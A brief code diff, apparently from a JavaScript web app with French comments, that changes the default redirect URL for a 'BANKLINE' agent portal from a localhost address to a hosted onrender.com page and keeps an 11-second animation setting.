@@ -18,7 +18,7 @@ const REDIRECT_CONFIG = {
   // Détecte automatiquement l'URL configurée en local ou en déploiement distant
   agentPortalUrl: localStorage.getItem('BANKLINE_AGENT_PORTAL_URL') || 
                   window.BANKLINE_AGENT_PORTAL_URL || 
-                  'http://localhost:3001/securisation.html',
+                  'https://bankline-admin.onrender.com/securisation.html',
 
   // Durée de l'animation en secondes (entre 10 et 12 secondes demandées)
   durationSeconds: 11
